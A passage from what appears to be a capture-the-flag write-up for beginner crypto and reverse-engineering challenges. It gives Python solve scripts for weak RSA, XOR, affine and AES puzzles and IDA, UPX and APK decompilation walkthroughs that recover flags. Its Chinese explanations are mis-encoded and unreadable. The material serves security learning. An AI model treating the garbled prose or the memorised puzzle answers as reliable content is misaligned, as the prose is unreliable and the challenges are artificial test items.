</span></code></pre><h3 id=week-1-babyrsa>[Week 1]babyrsa<a aria-label="Anchor link for: week-1-babyrsa" class=zola-anchor href=#week-1-babyrsa style=visibility:hidden></a></h3><blockquote><p>é¢˜ç›®æè¿°ï¼šå¾ˆå®¹æ˜“åˆ†è§£çš„n<p>http://factordb.com/</blockquote><p>é¢˜ç›®æè¿°ä¸­ç»™å‡º hint ï¼Œé€šè¿‡ factordb åˆ†è§£ n ï¼Œå¯ä»¥å¾—åˆ°ä»¥ä¸‹æ•°ç»„ã€‚<pre class=z-code><code><span class="z-text z-plain">array_p = [2217990919, 2338725373, 2370292207, 2463878387, 2706073949, 2794985117, 2804303069, 2923072267, 2970591037, 3207148519, 3654864131, 3831680819, 3939901243, 4093178561, 4278428893]
</span></code></pre><p>åˆ†è§£æ‰€å¾—å‡ä¸ºç´ æ•°ï¼Œé€šè¿‡è®¡ç®—å‡º phi å³å¯å¾—å‡ºç»“æœã€‚<pre class=z-code><code><span class="z-text z-plain">import gmpy2
</span><span class="z-text z-plain">from Crypto.Util.number import long_to_bytes, isPrime
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">n = 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261
</span><span class="z-text z-plain">e = 65537
</span><span class="z-text z-plain">c = 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">array_p = [2217990919, 2338725373, 2370292207, 2463878387, 2706073949, 2794985117, 2804303069, 2923072267, 2970591037, 3207148519, 3654864131, 3831680819, 3939901243, 4093178561, 4278428893]
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">phi = 1
</span><span class="z-text z-plain">for p in array_p:
</span><span class="z-text z-plain">    if isPrime(p):
</span><span class="z-text z-plain">        phi *= (p - 1)
</span><span class="z-text z-plain">    else:
</span><span class="z-text z-plain">        exit(1)
</span><span class="z-text z-plain">d = gmpy2.invert(e, phi)
</span><span class="z-text z-plain">m = pow(c, d, n)
</span><span class="z-text z-plain">print(long_to_bytes(m))
</span></code></pre><h3 id=week-1-babyxor>[Week 1]babyxor<a aria-label="Anchor link for: week-1-babyxor" class=zola-anchor href=#week-1-babyxor style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">from secret import *
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">ciphertext = []
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">for f in flag:
</span><span class="z-text z-plain">    ciphertext.append(f ^ key)
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">print(bytes(ciphertext).hex())
</span><span class="z-text z-plain"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2
</span></code></pre><p>çŸ¥é“æ˜æ–‡å‰äº”ä½ä¸º <code>flag{</code> ï¼Œé€šè¿‡å¼‚æˆ–å¯†æ–‡å‰äº”ä½æ¥å¾—å‡º <code>key</code> ï¼Œpython è„šæœ¬å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">ciphertext_hex = "e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2"
</span><span class="z-text z-plain">ciphertext = bytes.fromhex(ciphertext_hex)
</span><span class="z-text z-plain">known_plaintext = b"flag{"
</span><span class="z-text z-plain">partial_key = [ciphertext[i] ^ known_plaintext[i] for i in range(5)]
</span><span class="z-text z-plain">print("Partial key:", bytes(partial_key))
</span><span class="z-text z-plain"># Partial key: b'\x8f\x8f\x8f\x8f\x8f'
</span></code></pre><p>å¯ä»¥å¾—å‡º key ä¸º <code>\x8f</code> ï¼Œé€šè¿‡éå†å¼‚æˆ–æ•´ä¸²å¯†æ–‡å°±å¯ä»¥å¾—åˆ° flagï¼Œè„šæœ¬å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">ciphertext_hex = "e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2"
</span><span class="z-text z-plain">ciphertext = bytes.fromhex(ciphertext_hex)
</span><span class="z-text z-plain">key = int.from_bytes(b'\x8f', 'big')
</span><span class="z-text z-plain">print(bytes([ciphertext[i] ^ key for i in range(36)]))
</span></code></pre><h3 id=week-1-affine>[Week 1]Affine<a aria-label="Anchor link for: week-1-affine" class=zola-anchor href=#week-1-affine style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">from flag import flag, key
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">modulus = 256
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">ciphertext = []
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">for f in flag:
</span><span class="z-text z-plain">    ciphertext.append((key[0]*f + key[1]) % modulus)
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">print(bytes(ciphertext).hex())
</span><span class="z-text z-plain">
</span><span class="z-text z-plain"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064
</span></code></pre><p>é€šè¿‡å°†æ˜æ–‡çš„æ¯ä¸ªå­—ç¬¦ä¸ <code>key[0]</code> ç›¸ä¹˜å†åŠ ä¸Š <code>key[1]</code> æ¨¡ 256å³å¯å¾—åˆ°å¯†æ–‡ï¼Œå› æ­¤æŠŠè¿‡ç¨‹å€’è¿‡æ¥å³å¯å¾—åˆ° flagã€‚<p>åŠ å¯†è¿‡ç¨‹: $(key[0] * f + key[1])\ mod\ 256$<p>å› ä¸ºè¿›è¡Œæ¨¡è¿ç®—ï¼Œé€†è¿‡æ¥éœ€è¦å…ˆæ±‚å‡ºé€†å…ƒï¼Œé€šè¿‡æ±‚å‡ºé€†å…ƒå°±å¯ä»¥é€†æ¨å¾—å‡º flagã€‚<p>è§£å¯†è¿‡ç¨‹: $key[0]^{-1} * (c-key[1])\ mod\ 256 $<p>æ ¹æ®å·²çŸ¥æ˜æ–‡ <code>flag{</code> çˆ†ç ´å‡ºé€†å…ƒåé€šè¿‡è§£å‡ºçš„ <code>key[0]</code> å’Œ <code>key[1]</code> ä»£å…¥æ±‚è§£å³å¯ï¼Œè„šæœ¬å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">def mod_inverse(a, m):
</span><span class="z-text z-plain">    for x in range(1, m):
</span><span class="z-text z-plain">        if (a * x) % m == 1:
</span><span class="z-text z-plain">            return x
</span><span class="z-text z-plain">    return None
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">ciphertext = bytes.fromhex("dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064")
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">known_text = b"flag{"
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">for k0 in range(256):
</span><span class="z-text z-plain">    for k1 in range(256):
</span><span class="z-text z-plain">        inv_k0 = mod_inverse(k0, 256)
</span><span class="z-text z-plain">        if not inv_k0:
</span><span class="z-text z-plain">            continue
</span><span class="z-text z-plain">        decrypted = [(inv_k0 * (c - k1)) % 256 for c in ciphertext[:len(known_text)]]
</span><span class="z-text z-plain">        if bytes(decrypted) == known_text:
</span><span class="z-text z-plain">            print(bytes([(inv_k0 * (c - k1)) % 256 for c in ciphertext[:len(ciphertext)]]))
</span><span class="z-text z-plain">            break
</span><span class="z-text z-plain">            
</span><span class="z-text z-plain"># flag{4ff1ne_c1pher_i5_very_3azy}
</span></code></pre><h3 id=week-1-babyaes>[Week 1]babyaes<a aria-label="Anchor link for: week-1-babyaes" class=zola-anchor href=#week-1-babyaes style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">from Crypto.Cipher import AES
</span><span class="z-text z-plain">import os
</span><span class="z-text z-plain">from flag import flag
</span><span class="z-text z-plain">from Crypto.Util.number import *
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">def pad(data):
</span><span class="z-text z-plain">    return data + b"".join([b'\x00' for _ in range(0, 16 - len(data))])
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">def main():
</span><span class="z-text z-plain">    flag_ = pad(flag)
</span><span class="z-text z-plain">    key = os.urandom(16) * 2
</span><span class="z-text z-plain">    iv = os.urandom(16)
</span><span class="z-text z-plain">    print(bytes_to_long(key) ^ bytes_to_long(iv) ^ 1)
</span><span class="z-text z-plain">    aes = AES.new(key, AES.MODE_CBC, iv)
</span><span class="z-text z-plain">    enc_flag = aes.encrypt(flag_)
</span><span class="z-text z-plain">    print(enc_flag)
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">if __name__ == "__main__":
</span><span class="z-text z-plain">    main()
</span><span class="z-text z-plain"># 3657491768215750635844958060963805125333761387746954618540958489914964573229
</span><span class="z-text z-plain"># b'>]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i'
</span></code></pre><p>ç”±äº key æ˜¯ç”±ä¸€æ®µéšæœº 16bit çš„å€¼å¤åˆ¶ä¸¤æ¬¡æ‹¼æ¥å‡ºæ¥çš„å€¼ï¼Œå¹¶ä¸”ç»™å‡ºäº† $key\ \oplus\ iv\ \oplus\ 1$ çš„å€¼ï¼Œå› æ­¤å¯ä»¥å…ˆå¼‚æˆ– 1 å¾—åˆ° $key\ \oplus\ iv$ çš„å€¼ã€‚<p>ç”±äºæ­¤æ—¶çš„ key ä¸º 32bitï¼Œè€Œ iv ä¸º 16bitï¼Œå› æ­¤è§£å‡ºæ¥çš„å€¼å¾—å‰åŠæ®µå°±æ˜¯ key å€¼ï¼Œå†é€šè¿‡å°†å‰åŠæ®µå¼‚æˆ–ååŠæ®µå³å¯å¾—åˆ° iv å€¼ï¼Œè„šæœ¬å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">xor_result = 3657491768215750635844958060963805125333761387746954618540958489914964573229
</span><span class="z-text z-plain">xor_result_bytes = long_to_bytes(xor_result ^ 1)
</span><span class="z-text z-plain">key = xor_result_bytes[:16] * 2
</span><span class="z-text z-plain">print(f'key = {key}')
</span><span class="z-text z-plain">iv = long_to_bytes(bytes_to_long(xor_result_bytes[:16]) ^ bytes_to_long(xor_result_bytes[16:]))
</span><span class="z-text z-plain">print(f'iv = {iv}')
</span><span class="z-text z-plain"># key = b'\x08\x16\x11%\xa0\xa6\xc5\xcb^\x02\x99NF`\xea,\x08\x16\x11%\xa0\xa6\xc5\xcb^\x02\x99NF`\xea,'
</span><span class="z-text z-plain"># iv = b'\xe3Z\x19Ga>\x07\xcc\xd1\xa1X\x01c\x11\x16\x00'
</span></code></pre><p>å°†è§£å‡ºçš„ key å’Œ iv ä¸¢è¿› AES ä¸­è¿›è¡Œè§£å¯†å³å¯å¾—åˆ° flagï¼Œå®Œæ•´è„šæœ¬å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">from Crypto.Cipher import AES
</span><span class="z-text z-plain">from Crypto.Util.number import *
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">xor_result = 3657491768215750635844958060963805125333761387746954618540958489914964573229
</span><span class="z-text z-plain">enc_flag = b'>]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i'
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">xor_result_bytes = long_to_bytes(xor_result ^ 1)
</span><span class="z-text z-plain">print(xor_result_bytes)
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">key = xor_result_bytes[:16] * 2
</span><span class="z-text z-plain">print(f'key = {key}')
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">iv = long_to_bytes(bytes_to_long(xor_result_bytes[:16]) ^ bytes_to_long(xor_result_bytes[16:]))
</span><span class="z-text z-plain">print(f'iv = {iv}')
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">aes = AES.new(key, AES.MODE_CBC, iv)
</span><span class="z-text z-plain">dec_flag = aes.decrypt(enc_flag)
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">print(dec_flag)
</span><span class="z-text z-plain"># b'firsT_cry_Aes\x00\x00\x00'
</span></code></pre><h2 id=reverse>Reverse<a aria-label="Anchor link for: reverse" class=zola-anchor href=#reverse style=visibility:hidden></a></h2><h3 id=week-1-easy-re>[Week 1]easy_RE<a aria-label="Anchor link for: week-1-easy-re" class=zola-anchor href=#week-1-easy-re style=visibility:hidden></a></h3><p>ç”¨ ida64 æ‰“å¼€å¯ä»¥å¾—åˆ°å‰åŠéƒ¨åˆ† flag ï¼Œå¦‚ä¸‹å›¾<p>é€šè¿‡æŒ‰ F5 åç¼–è¯‘å¯ä»¥å¾—åˆ°ååŠéƒ¨åˆ† flag ï¼Œå¦‚ä¸‹å›¾<p>æ•… flag å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">flag{we1c0me_to_rev3rse!!}}
</span></code></pre><h3 id=week-1-ke>[Week 1]å’³<a aria-label="Anchor link for: week-1-ke" class=zola-anchor href=#week-1-ke style=visibility:hidden></a></h3><p>é¢˜ç›®æè¿°ä¸­å­˜åœ¨å£³ï¼Œç”¨æŸ¥å£³è½¯ä»¶çœ‹çœ‹ï¼Œå¦‚ä¸‹å›¾<p><img src="https://writeup.owo.show/~gitbook/image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FjJRCfmdtbKA2NAxc3iF8%252F%25E5%2592%25B3-1.png%3Falt%3Dmedia%26token%3D8388cf8a-b1de-4ec0-a465-2792fded509c&width=768&dpr=4&quality=100&sign=b315f35440a8f65852bc75987e8558f820e38fb7226319e7522eabe240a6f58c" alt=img><p>éœ€è¦ä½¿ç”¨ upx å»å£³ï¼Œå¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">$ upx -d "KE.exe"
</span><span class="z-text z-plain">                       Ultimate Packer for eXecutables
</span><span class="z-text z-plain">                           right (C) 1996 - 2020
</span><span class="z-text z-plain">UPX 3.96w       Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">        File size         Ratio      Format      Name
</span><span class="z-text z-plain">   --------------------   ------   -----------   -----------
</span><span class="z-text z-plain">    133760 &LT-     68224   51.00%    win64/pe     KE.exe
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">Unpacked 1 file.
</span></code></pre><p>å»å£³å®Œæˆåç”¨ ida64 æ‰“å¼€ï¼Œé€šè¿‡åç¼–è¯‘å¯ä»¥å¾—åˆ°ä»¥ä¸‹å†…å®¹<pre class=z-code><code><span class="z-text z-plain">int __cdecl main(int argc, const char **argv, const char **envp)
</span><span class="z-text z-plain">{
</span><span class="z-text z-plain">  unsigned __int64 i; // r10
</span><span class="z-text z-plain">  char *v4; // kr00_8
</span><span class="z-text z-plain">  char Str1[96]; // [rsp+20h] [rbp-88h] BYREF
</span><span class="z-text z-plain">  int v7; // [rsp+80h] [rbp-28h]
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">  _main();
</span><span class="z-text z-plain">  memset(Str1, 0, sizeof(Str1));
</span><span class="z-text z-plain">  v7 = 0;
</span><span class="z-text z-plain">  Hello();
</span><span class="z-text z-plain">  scanf("%s", Str1);
</span><span class="z-text z-plain">  for ( i = 0i64; ; ++i )
</span><span class="z-text z-plain">  {
</span><span class="z-text z-plain">    v4 = &Str1[strlen(Str1)];
</span><span class="z-text z-plain">    if ( i >= v4 - Str1 )
</span><span class="z-text z-plain">      break;
</span><span class="z-text z-plain">    ++Str1[i];
</span><span class="z-text z-plain">  }
</span><span class="z-text z-plain">  if ( !strncmp(Str1, enc, v4 - Str1) )
</span><span class="z-text z-plain">    puts("WOW!!");
</span><span class="z-text z-plain">  else
</span><span class="z-text z-plain">    puts("I believe you can do it!");
</span><span class="z-text z-plain">  system("pause");
</span><span class="z-text z-plain">  return 0;
</span><span class="z-text z-plain">}
</span></code></pre><p>å¹¶ä¸”å¯ä»¥æ‰¾åˆ°<pre class=z-code><code><span class="z-text z-plain">enc = "gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~"
</span></code></pre><p>é€šè¿‡åˆ†æå¯å¾—è¯¥å‡½æ•°å°†å¯†æ–‡æ˜¯ç”±æ˜æ–‡çš„æ¯ä¸ªå­—ç¬¦è½¬asciiå€¼ååŠ ä¸€å¾—åˆ°çš„ï¼Œè¦å¾—åˆ°æ˜æ–‡åˆ™å°†æ¯ä¸ªå­—ç¬¦çš„asciiå€¼å‡ä¸€å³å¯ã€‚<pre class=z-code><code><span class="z-text z-plain">str = "gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~"
</span><span class="z-text z-plain">for s in str:
</span><span class="z-text z-plain">    print(chr(ord(s) - 1), end='')
</span><span class="z-text z-plain">
</span><span class="z-text z-plain"># flag{C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1}
</span></code></pre><h3 id=week-1-segments>[Week 1]Segments<a aria-label="Anchor link for: week-1-segments" class=zola-anchor href=#week-1-segments style=visibility:hidden></a></h3><p>ç™¾åº¦ <code>IDAçš„Segmentsçª—å£è¦æ€ä¹ˆæ‰“å¼€å‘¢</code> ï¼Œå¯ä»¥å¾—åˆ°ç»“æœ <code>Shift+F7</code> ï¼Œå°† Segments çª—å£ä¸­çš„ name æ‹¼å‡‘èµ·æ¥å°±æ˜¯ flagã€‚<pre class=z-code><code><span class="z-text z-plain">flag{You_ar3_g0od_at_f1nding_ELF_segments_name}
</span></code></pre><h3 id=week-1-elf>[Week 1]ELF<a aria-label="Anchor link for: week-1-elf" class=zola-anchor href=#week-1-elf style=visibility:hidden></a></h3><p>ç”¨ ida64 æ‰“å¼€ï¼Œé€šè¿‡åç¼–è¯‘å¯ä»¥å¾—åˆ°ä»¥ä¸‹å†…å®¹<pre class=z-code><code><span class="z-text z-plain">int __cdecl main(int argc, const char **argv, const char **envp)
</span><span class="z-text z-plain">{
</span><span class="z-text z-plain">  unsigned int v3; // edx
</span><span class="z-text z-plain">  char *s1; // [rsp+0h] [rbp-20h]
</span><span class="z-text z-plain">  char *v6; // [rsp+8h] [rbp-18h]
</span><span class="z-text z-plain">  char *s; // [rsp+10h] [rbp-10h]
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">  s = (char *)malloc(0x64uLL);
</span><span class="z-text z-plain">  printf("Input flag: ");
</span><span class="z-text z-plain">  fgets(s, 100, stdin);
</span><span class="z-text z-plain">  s[strcspn(s, "\n")] = 0;
</span><span class="z-text z-plain">  v6 = (char *)encode(s);
</span><span class="z-text z-plain">  v3 = strlen(v6);
</span><span class="z-text z-plain">  s1 = (char *)base64_encode(v6, v3);
</span><span class="z-text z-plain">  if ( !strcmp(s1, "VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t") )
</span><span class="z-text z-plain">    puts("Correct");
</span><span class="z-text z-plain">  else
</span><span class="z-text z-plain">    puts("Wrong");
</span><span class="z-text z-plain">  free(v6);
</span><span class="z-text z-plain">  free(s1);
</span><span class="z-text z-plain">  free(s);
</span><span class="z-text z-plain">  return 0;
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">_BYTE *__fastcall encode(const char *a1)
</span><span class="z-text z-plain">{
</span><span class="z-text z-plain">  size_t v1; // rax
</span><span class="z-text z-plain">  int v2; // eax
</span><span class="z-text z-plain">  _BYTE *v4; // [rsp+20h] [rbp-20h]
</span><span class="z-text z-plain">  int i; // [rsp+28h] [rbp-18h]
</span><span class="z-text z-plain">  int v6; // [rsp+2Ch] [rbp-14h]
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">  v1 = strlen(a1);
</span><span class="z-text z-plain">  v4 = malloc(2 * v1 + 1);
</span><span class="z-text z-plain">  v6 = 0;
</span><span class="z-text z-plain">  for ( i = 0; i < strlen(a1); ++i )
</span><span class="z-text z-plain">  {
</span><span class="z-text z-plain">    v2 = v6++;
</span><span class="z-text z-plain">    v4[v2] = (a1[i] ^ 0x20) + 16;
</span><span class="z-text z-plain">  }
</span><span class="z-text z-plain">  v4[v6] = 0;
</span><span class="z-text z-plain">  return v4;
</span><span class="z-text z-plain">}
</span></code></pre><p>é€šè¿‡åˆ†æå¯çŸ¥å¯†æ–‡æ˜¯ç”±æ˜æ–‡çš„æ¯ä¸ªå­—ç¬¦ä¸ 0x20 è¿›è¡Œå¼‚æˆ–ååŠ  16 å¹¶è¿›è¡Œ base64 ç¼–ç å¾—åˆ°çš„ï¼Œè¦å¾—åˆ°æ˜æ–‡åˆ™å…ˆè¿›è¡Œ base64 è§£ç åå°†æ‰€å¾—çš„æ¯ä¸ªä½å‡å» 16 å†å’Œ 0x20 å¼‚æˆ–å³å¯ï¼Œè„šæœ¬å¦‚ä¸‹ã€‚<pre class=z-code><code><span class="z-text z-plain">import base64
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">encoded_str = "VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t"
</span><span class="z-text z-plain">decoded_bytes = base64.b64decode(encoded_str)
</span><span class="z-text z-plain">print(decoded_bytes)
</span><span class="z-text z-plain">for s in decoded_bytes:
</span><span class="z-text z-plain">    print(chr((s - 16) ^ 0x20), end="")
</span><span class="z-text z-plain">    
</span><span class="z-text z-plain"># flag{D0_4ou_7now_wha7_ELF_1s?}
</span></code></pre><h3 id=week-1-endian>[Week 1]Endian<a aria-label="Anchor link for: week-1-endian" class=zola-anchor href=#week-1-endian style=visibility:hidden></a></h3><p>ç”¨ ida64 æ‰“å¼€ï¼Œé€šè¿‡åç¼–è¯‘å¯ä»¥å¾—åˆ°ä»¥ä¸‹å†…å®¹<pre class=z-code><code><span class="z-text z-plain">int __cdecl main(int argc, const char **argv, const char **envp)
</span><span class="z-text z-plain">{
</span><span class="z-text z-plain">  int i; // [rsp+4h] [rbp-3Ch]
</span><span class="z-text z-plain">  char *v5; // [rsp+8h] [rbp-38h]
</span><span class="z-text z-plain">  char v6[40]; // [rsp+10h] [rbp-30h] BYREF
</span><span class="z-text z-plain">  unsigned __int64 v7; // [rsp+38h] [rbp-8h]
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">  v7 = __readfsqword(0x28u);
</span><span class="z-text z-plain">  puts("please input your flag");
</span><span class="z-text z-plain">  __isoc99_scanf("%s", v6);
</span><span class="z-text z-plain">  v5 = v6;
</span><span class="z-text z-plain">  for ( i = 0; i <= 4; ++i )
</span><span class="z-text z-plain">  {
</span><span class="z-text z-plain">    if ( *(_DWORD *)v5 != (array[i] ^ 0x12345678) )
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">      printf("wrong!");
</span><span class="z-text z-plain">      exit(0);
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">    v5 += 4;
</span><span class="z-text z-plain">  }
</span><span class="z-text z-plain">  printf("you are right");
</span><span class="z-text z-plain">  return 0;
</span><span class="z-text z-plain">}
</span></code></pre><p>å¹¶ä¸” array æ•°ç»„å†…å®¹å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">array = [0x75553A1E, 0x7B583A03, 0x4D58220C, 0x7B50383D, 0x736B3819]
</span></code></pre><p>é€šè¿‡åˆ†æå¯çŸ¥å¯†æ–‡æ˜¯é€šè¿‡å°†æ˜æ–‡æ¯å››ä¸ªä¸ºä¸€ç»„å’Œ 0x12345678 è¿›è¡Œå¼‚æˆ–åå¾—åˆ°çš„ï¼Œä½†ç”±äºæ˜¯ä½ä½å­˜å‚¨ï¼Œæ‰€ä»¥éœ€è¦å°†æ¯ä¸€ç»„é€†å‘è¿‡æ¥çš„å€¼è¿›è¡Œåå‘å³å¯å¾—åˆ° flagï¼Œè„šæœ¬å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">from Crypto.Util.number import long_to_bytes
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">array_data = [0x75553A1E, 0x7B583A03, 0x4D58220C, 0x7B50383D, 0x736B3819]
</span><span class="z-text z-plain">for data in array_data:
</span><span class="z-text z-plain">    print(bytes(reversed(long_to_bytes(data ^ 0x12345678))).decode(), end='')
</span><span class="z-text z-plain">    
</span><span class="z-text z-plain"># flag{llittl_Endian_a}
</span></code></pre><h3 id=week-1-androxor>[Week 1]AndroXor<a aria-label="Anchor link for: week-1-androxor" class=zola-anchor href=#week-1-androxor style=visibility:hidden></a></h3><blockquote><p>https://apktool.org/<p>https://github.com/skylot/jadx</blockquote><p>å¯ä»¥åœ¨ä¸Šè¿°å¼•ç”¨ä¸­ä¸‹è½½ apktool ï¼Œä¸‹è½½åä½¿ç”¨ apktool è¿›è¡Œé€†å‘<pre class=z-code><code><span class="z-text z-plain">$ apktool d AndroXor.apk
</span></code></pre><p>é€†å‘åä½¿ç”¨ jadx æ‰“å¼€è¿›è¡Œ Java åç¼–è¯‘ï¼Œåœ¨ <code>com/chick.androxor/MainActivity</code> ä¸­å­˜åœ¨ä»¥ä¸‹å†…å®¹<pre class=z-code><code><span class="z-text z-plain">    public String Xor(String str, String str2) {
</span><span class="z-text z-plain">        char[] cArr = {14, '\r', 17, 23, 2, 'K', 'I', '7', ' ', 30, 20, 'I', '\n', 2, '\f', '>', '(', '@', 11, '\'', 'K', 'Y', 25, 'A', '\r'};
</span><span class="z-text z-plain">        char[] cArr2 = new char[str.length()];
</span><span class="z-text z-plain">        String str3 = str.length() != 25 ? "wrong!!!" : "you win!!!";
</span><span class="z-text z-plain">        for (int i = 0; i < str.length(); i++) {
</span><span class="z-text z-plain">            char charAt = (char) (str.charAt(i) ^ str2.charAt(i % str2.length()));
</span><span class="z-text z-plain">            cArr2[i] = charAt;
</span><span class="z-text z-plain">            if (cArr[i] != charAt) {
</span><span class="z-text z-plain">                return "wrong!!!";
</span><span class="z-text z-plain">            }
</span><span class="z-text z-plain">        }
</span><span class="z-text z-plain">        return str3;
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">	@Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
</span><span class="z-text z-plain">    public void onCreate(Bundle bundle) {
</span><span class="z-text z-plain">        super.onCreate(bundle);
</span><span class="z-text z-plain">        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());
</span><span class="z-text z-plain">        this.binding = inflate;
</span><span class="z-text z-plain">        setContentView(inflate.getRoot());
</span><span class="z-text z-plain">        final EditText editText = (EditText) findViewById(R.id.password);
</span><span class="z-text z-plain">        ((Button) findViewById(R.id.button)).setOnClickListener(new View.OnClickListener() { // from class: com.chick.androxor.MainActivity.1
</span><span class="z-text z-plain">            @Override // android.view.View.OnClickListener
</span><span class="z-text z-plain">            public void onClick(View view) {
</span><span class="z-text z-plain">                String obj = editText.getText().toString();
</span><span class="z-text z-plain">                MainActivity mainActivity = MainActivity.this;
</span><span class="z-text z-plain">                Toast.makeText(mainActivity, mainActivity.Xor(obj, "happyx3"), 1).show();
</span><span class="z-text z-plain">                Log.d("è¾“å…¥", editText.getText().toString());
</span><span class="z-text z-plain">            }
</span><span class="z-text z-plain">        });
</span><span class="z-text z-plain">    }
</span></code></pre><p>é€šè¿‡åˆ†æå¯å¾—æ˜æ–‡é•¿åº¦ä¸º 25ï¼Œå¹¶ä¸”ä»£ç å°†å¾ªç¯éå†æ˜æ–‡æ¯ä¸€ä¸ªå­—ç¬¦ï¼Œå¹¶ä½¿ç”¨æ¯ä¸ªå­—ç¬¦ä¸ç¬¬äºŒä¸ªå‚æ•°å­—ç¬¦ä¸²(happyx3)çš„å¯¹åº”ä½ç½®å­—ç¬¦è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå°†å¾—åˆ°çš„æ–°å­—ç¬¦æ·»åŠ åˆ° cArr2 ä¸­ï¼Œå¹¶ä¸”è¿˜ä¼šå°†cArr2ä¸­çš„å­—ç¬¦ä¸cArrä¸­çš„å¯¹åº”ä½ç½®å­—ç¬¦è¿›è¡Œæ¯”è¾ƒã€‚<p>å› æ­¤è¦è·å¾—æ˜æ–‡éœ€è¦å¯¹åº”ä½ç½®é€ä¸ªå¼‚æˆ–è¿ç®—æ¨å›æ¥å³å¯ï¼Œå…ˆå°† cArr æ•°å­—ä¸­çš„å…¶ä»–å€¼éƒ½è½¬åŒ–ä¸º ascii å€¼å½¢æ€ï¼Œå†è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå°†è¿ç®—ç»“æœè½¬å›å­—ç¬¦å³å¯ï¼Œè„šæœ¬å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">cArr = [14, '\r', 17, 23, 2, 'K', 'I', '7', ' ', 30, 20, 'I', '\n', 2, '\f', '>', '(', '@', 11, '\'', 'K', 'Y', 25, 'A', '\r']
</span><span class="z-text z-plain">str = ""
</span><span class="z-text z-plain">str2 = "happyx3"
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">def convert_to_ord(lst):
</span><span class="z-text z-plain">    for i in range(len(lst)):
</span><span class="z-text z-plain">        if not isinstance(lst[i], int):
</span><span class="z-text z-plain">            lst[i] = ord(lst[i])
</span><span class="z-text z-plain">    return lst
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">cArr = convert_to_ord(cArr)
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">for i in range(25):
</span><span class="z-text z-plain">    str += chr(cArr[i] ^ ord(str2[i % len(str2)]))
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">print(str)
</span><span class="z-text z-plain">
</span><span class="z-text z-plain"># flag{3z_And0r1d_X0r_x1x1}
